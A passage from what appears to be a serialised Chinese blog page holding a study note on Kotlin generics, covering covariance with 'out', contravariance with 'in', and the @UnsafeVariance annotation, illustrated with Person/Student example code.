punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译不能通过</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译可以通过</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>这是因为List这个类型用到了泛型的协变，这类问题我们应该使用泛型的协变来处理</p>\n<p>实际上Java为了杜绝安全隐患，是不允许这样传递参数的。换句话说，即使 Student是Person的子类，SimpleData并不是SimpleData的子 类。</p>\n<p>但稍作思考，像crossinline那样，我们可以做一个约定来避免类型转换的安全隐患。如果我们约定泛型T是只读的话（也就是不能改变)，也就能避免类型转换的安全隐患，但那样就意味着我们这个类的参数中不能含有泛型。这样持有泛型的类型便会拥有泛型类型的继承关系。</p>\n<p>这里引用一下《第一行代码: 第三版》中对泛型协变的定义</p>\n<blockquote>\n<p>假如定义了一个MyClass的泛型类，其中A 是B的子类型，同时MyClass<a>又是MyClass<b>的子类型，那么我们就可以称MyClass在T这个泛型上是协变的。</b></a></p><a><b>\n</b></a></blockquote><a><b>\n</b></a><b><h3 id=\"屁话多！如何使用\"><a></a><a href=\"#屁话多！如何使用\" class=\"headerlink\" title=\"屁话多！如何使用\"></a>屁话多！如何使用</h3><p>只需要在声明泛型时在前面加上out修饰符即可，之后你便需要遵守协变的约定</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 声明泛型时在前面加个out即可规定这个类在这个泛型上是协变的</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// 不合法，因为外部可以访问并修改这个变量</span>\n    <span class=\"token comment\">// 编译不通过</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，外部无法访问这个变量</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，因为这是常量，常量值无法被修改</span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>\n    <span class=\"token comment\">// 编译不通过</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 这样做是合法的，方法的返回值可以使用泛型</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 使用协变后 编译通过</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译可以通过</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"逆变\"><a href=\"#逆变\" class=\"headerlink\" title=\"逆变\"></a>逆变</h2><p>协变让我们可以将Data&lt;Student&gt;隐式向上转型变成Data&lt;Person&gt;</p>\n<p>那么逆变自然是让我们可以向下转型，并且它是隐式的</p>\n<p>只要我们约定泛型不会在返回值中使用，就可以让持有泛型的类<strong>隐式的</strong>向下转型 (隐式的向上转型意味着这可能不会像协变那样安全)</p>\n<h3 id=\"使用示例\"><a href=\"#使用示例\" class=\"headerlink\" title=\"使用示例\"></a>使用示例</h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> Transformer<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> T<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> trans <span class=\"token operator\">=</span> <span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> Person<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">.</span>name\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 如果不声明逆变 这行代码无法通过编译</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Student<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> student <span class=\"token operator\">=</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tom\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> trans<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>student<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"UnsafeVariance注解\"><a href=\"#UnsafeVariance注解\" class=\"headerlink\" title=\"@UnsafeVariance注解\"></a>@UnsafeVariance注解</h2><p>在你违反了协变/逆变的约定时，可以使用这个注解让编译通过</p>\n<p>但正如它的字面意思，<strong>它不安全</strong></p>\n<p>在迫不得已要使用它的情况下，你必须清楚你在做什么</p>\n<h3 id=\"使用示例-1\"><a href=\"#使用示例-1\" class=\"headerlink\" title=\"使用示例\"></a>使用示例</h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">// 不合法，因为外部可以访问并修改这个变量</span>\n    <span class=\"token comment\">// 使用@UnsafeVariance注解，编译通过</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，外部无法访问这个变量</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，因为这是常量，常量值无法被修改</span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>\n    <span class=\"token comment\">// 使用@UnsafeVariance注解，编译通过</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 这样做是合法的，方法的返回值可以使用泛型</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n</b>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Kotlin-泛型协变-x2F-逆变学习笔记\"><a href=\"#Kotlin-泛型协变-x2F-逆变学习笔记\" class=\"headerlink\" title=\"Kotlin 泛型协变&#x2F;逆变学习笔记\"></a>Kotlin 泛型协变&#x2F;逆变学习笔记</h1><h2 id=\"协变\"><a href=\"#协变\" class=\"headerlink\" title=\"协变\"></a>协变</h2><h3 id=\"我的理解\"><a href=\"#我的理解\" class=\"headerlink\" title=\"我的理解\"></a>我的理解</h3><p>设想以下情况: Student是Person的子类</p>\n<p>我们定义了一个Data&lt;T&gt;(val data: T)作为容器来存放他们</p>\n<p>函数test接受一个类型为Data&lt;Person&gt;的参数,我们手上有一个类型为Data&lt;Student&gt;的实例</p>\n<p>我们理所当然的把它作为参数传入test函数，却发现编译无法通过</p>\n<p>这时你傻眼了，原来Data&lt;Student&gt;跟本无法作为一个Data&lt;Person&gt;的参数传入函数，也就是没法隐式向下转型</p>\n<p>但我们发现，使用List这样的容器是允许这样做的</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译不能通过</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译可以通过</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>这是因为List这个类型用到了泛型的协变，这类问题我们应该使用泛型的协变来处理</p>\n<p>实际上Java为了杜绝安全隐患，是不允许这样传递参数的。换句话说，即使 Student是Person的子类，SimpleData并不是SimpleData的子 类。</p>\n<p>但稍作思考，像crossinline那样，我们可以做一个约定来避免类型转换的安全隐患。如果我们约定泛型T是只读的话（也就是不能改变)，也就能避免类型转换的安全隐患，但那样就意味着我们这个类的参数中不能含有泛型。这样持有泛型的类型便会拥有泛型类型的继承关系。</p>\n<p>这里引用一下《第一行代码: 第三版》中对泛型协变的定义</p>\n<blockquote>\n<p>假如定义了一个MyClass的泛型类，其中A 是B的子类型，同时MyClass<A>又是MyClass<B>的子类型，那么我们就可以称MyClass在T这个泛型上是协变的。</p>\n</blockquote>\n<h3 id=\"屁话多！如何使用\"><a href=\"#屁话多！如何使用\" class=\"headerlink\" title=\"屁话多！如何使用\"></a>屁话多！如何使用</h3><p>只需要在声明泛型时在前面加上out修饰符即可，之后你便需要遵守协变的约定</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 声明泛型时在前面加个out即可规定这个类在这个泛型上是协变的</span>\n<span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// 不合法，因为外部可以访问并修改这个变量</span>\n    <span class=\"token comment\">// 编译不通过</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，外部无法访问这个变量</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，因为这是常量，常量值无法被修改</span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>\n    <span class=\"token comment\">// 编译不通过</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 这样做是合法的，方法的返回值可以使用泛型</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>people<span class=\"token operator\">:</span> Data<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> studentList <span class=\"token operator\">=</span> <span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> <span class=\"token function\">Data</span><span class=\"token punctuation\">(</span><span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xxx\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 使用协变后 编译通过</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>studentList<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 编译可以通过</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"逆变\"><a href=\"#逆变\" class=\"headerlink\" title=\"逆变\"></a>逆变</h2><p>协变让我们可以将Data&lt;Student&gt;隐式向上转型变成Data&lt;Person&gt;</p>\n<p>那么逆变自然是让我们可以向下转型，并且它是隐式的</p>\n<p>只要我们约定泛型不会在返回值中使用，就可以让持有泛型的类<strong>隐式的</strong>向下转型 (隐式的向上转型意味着这可能不会像协变那样安全)</p>\n<h3 id=\"使用示例\"><a href=\"#使用示例\" class=\"headerlink\" title=\"使用示例\"></a>使用示例</h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">open</span> <span class=\"token keyword\">class</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">class</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> level<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span 